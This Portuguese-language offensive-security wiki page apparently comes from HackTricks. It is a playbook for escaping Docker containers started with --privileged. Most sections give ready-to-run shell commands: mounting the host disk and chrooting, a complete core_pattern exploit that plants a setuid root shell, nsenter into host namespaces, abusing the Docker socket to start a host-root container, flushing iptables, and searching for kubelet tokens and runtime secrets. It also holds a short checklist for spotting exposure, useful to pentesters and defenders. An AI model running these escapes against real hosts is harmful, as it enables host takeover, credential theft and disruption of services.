# Escaping De Containers `--privileged`

{{#include ../../../banners/hacktricks-training.md}}

## Visão Geral

Um container iniciado com `--privileged` não é a mesma coisa que um container normal com uma ou duas permissões extras. Na prática, `--privileged` remove ou enfraquece várias das proteções padrão do runtime que normalmente mantêm o workload afastado de recursos perigosos do host. O efeito exato ainda depende do runtime e do host, mas, no Docker, o resultado usual é:

- todas as capabilities são concedidas
- as restrições do cgroup de devices são removidas
- muitos filesystems do kernel deixam de ser montados como somente leitura
- os caminhos padrão mascarados do procfs desaparecem
- o filtro do seccomp é desabilitado
- o confinamento do AppArmor é desabilitado
- o isolamento do SELinux é desabilitado ou substituído por um label muito mais abrangente

A consequência importante é que um container privilegiado geralmente **não** precisa de um kernel exploit sutil. Em muitos casos, ele pode simplesmente interagir diretamente com devices do host, filesystems do kernel voltados ao host ou interfaces do runtime e, em seguida, fazer pivot para um shell no host.

## O Que `--privileged` Não Altera Automaticamente

`--privileged` **não** ingressa automaticamente nos namespaces de PID, rede, IPC ou UTS do host. Um container privilegiado ainda pode ter namespaces privados. Isso significa que algumas cadeias de escape exigem uma condição adicional, como:

- um bind mount do host
- compartilhamento do PID do host
- rede do host
- devices do host visíveis
- interfaces proc/sys com permissão de escrita

Essas condições geralmente são fáceis de satisfazer em misconfigurations reais, mas são conceitualmente separadas do próprio `--privileged`.

## Caminhos De Escape

### 1. Montar O Disco Do Host Através De Devices Expostos

Um container privilegiado geralmente vê muito mais device nodes em `/dev`. Se o block device do host estiver visível, o escape mais simples é montá-lo e executar `chroot` no filesystem do host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Se a partição root não for óbvia, enumere primeiro o layout de blocos:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Se o caminho prático for colocar um helper setuid em um mount do host com permissão de escrita, em vez de usar `chroot`, lembre-se de que nem todo filesystem respeita o bit setuid. Uma verificação rápida das capacidades no host é:
```bash
mount | grep -v "nosuid"
```
Isso é útil porque caminhos graváveis em filesystems `nosuid` são muito menos interessantes para fluxos de trabalho clássicos de "depositar um shell setuid e executá-lo posteriormente".

As proteções enfraquecidas exploradas aqui são:

- exposição completa de dispositivos
- capabilities amplas, especialmente `CAP_SYS_ADMIN`

Páginas relacionadas:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Montar ou Reutilizar um Bind Mount do Host e Executar `chroot`

Se o filesystem raiz do host já estiver montado dentro do container, ou se o container puder criar os mounts necessários por ser privileged, um shell do host geralmente estará a apenas um `chroot` de distância:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Se não existir um bind mount da raiz do host, mas o armazenamento do host estiver acessível, crie um:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Este caminho explora:

- restrições de mount enfraquecidas
- capabilities completas
- ausência de confinamento MAC

Páginas relacionadas:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Explore `/proc/sys` Ou `/sys` Com Permissão de Escrita

Uma das principais consequências de `--privileged` é que as proteções de procfs e sysfs se tornam muito mais fracas. Isso pode expor interfaces do kernel voltadas ao host que normalmente ficam mascaradas ou montadas como somente leitura.

Um exemplo clássico é `core_pattern`:<sup>[[1]](#references)</sup>
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Outros caminhos de alto valor incluem:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Este caminho explora:

- caminhos mascarados ausentes
- caminhos de sistema somente leitura ausentes

Páginas relacionadas:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Use Full Capabilities For Mount- Or Namespace-Based Escape

Um container privilegiado obtém as capabilities que normalmente são removidas de containers padrão, incluindo `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` e muitas outras. Isso geralmente é suficiente para transformar um foothold local em um escape do host assim que outra superfície exposta estiver disponível.

Um exemplo simples é montar filesystems adicionais e usar a entrada em namespaces:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Se o PID do host também for compartilhado, a etapa fica ainda mais curta:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Este caminho explora:

- o conjunto padrão de capabilities privilegiadas
- o compartilhamento opcional do PID do host

Páginas relacionadas:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape Através de Sockets do Runtime

Um container privilegiado frequentemente acaba com o estado ou os sockets do runtime do host visíveis. Se um socket do Docker, containerd ou CRI-O estiver acessível, a abordagem mais simples geralmente é usar a API do runtime para iniciar um segundo container com acesso ao host:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Para containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Este caminho explora:

- exposição ao runtime privilegiado
- bind mounts do host criados pelo próprio runtime

Páginas relacionadas:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Remover os efeitos colaterais do isolamento de rede

`--privileged` não ingressa, por si só, no namespace de rede do host, mas, se o container também tiver `--network=host` ou outro acesso à rede do host, toda a pilha de rede se torna mutável:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Isso nem sempre resulta em um shell direto no host, mas pode permitir denial of service, interceptação de tráfego ou acesso a serviços de gerenciamento acessíveis apenas pelo loopback.

Páginas relacionadas:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Ler Segredos do Host e o Estado do Runtime

Mesmo quando um escape de shell limpo não é imediato, containers privilegiados frequentemente têm acesso suficiente para ler segredos do host, o estado do kubelet, metadados do runtime e os sistemas de arquivos de containers vizinhos:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Se `/var` estiver montado a partir do host ou os diretórios de runtime estiverem visíveis, isso pode ser suficiente para movimentação lateral ou roubo de credenciais de cloud/Kubernetes mesmo antes de obter um shell no host.

Páginas relacionadas:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Verificações

O objetivo dos comandos a seguir é confirmar quais famílias de escape de privileged-container são imediatamente viáveis.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
O que é interessante aqui:

- um conjunto completo de capabilities, especialmente `CAP_SYS_ADMIN`
- exposição gravável de proc/sys
- dispositivos do host visíveis
- ausência de seccomp e de confinamento MAC
- runtime sockets ou bind mounts da root do host

Qualquer um desses itens pode ser suficiente para post-exploitation. Vários deles juntos geralmente significam que o container está, funcionalmente, a um ou dois comandos de um comprometimento do host.

## Páginas relacionadas

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

## Referências

- [1] [Escaping privileged containers for fun](https://pwning.systems/posts/escaping-containers-for-fun/)

{{#include ../../../banners/hacktricks-training.md}}
